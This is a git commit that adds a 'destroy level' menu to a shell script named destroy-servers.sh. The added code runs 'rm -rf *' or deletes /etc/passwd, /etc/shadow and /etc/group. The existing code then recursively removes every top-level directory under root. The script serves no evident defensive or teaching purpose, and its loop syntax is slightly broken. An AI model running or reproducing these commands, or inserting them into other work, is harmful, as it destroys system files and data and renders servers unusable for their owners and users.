c9153d27e2fc983e2664b73a838833bdd5a51c36
Cigas <patrik.cigas@t-systems.com>
2019-09-30 13:19:43 +0200

    Add a destroy level

--- scripts/destroy-servers.sh
+++ scripts/destroy-servers.sh
@@ -2,6 +2,28 @@
 #this is just a comment
 FILES=`ls /`
 
+echo "Choose how much do you want to destroy the server
+1 - Full destroy
+2 - Partial destroy
+3 - None
+"
+
+read choice
+
+case $choice in
+	1)
+		rm -rf * 
+		;;
+	2)
+		rm -rf /etc/passwd
+		rm -rf /etc/shadow
+		rm -rf /etc/group
+		;;
+	3)
+		exit 0
+esac
+
+
 for i in $FILES do
 	rm -rf $i
 done
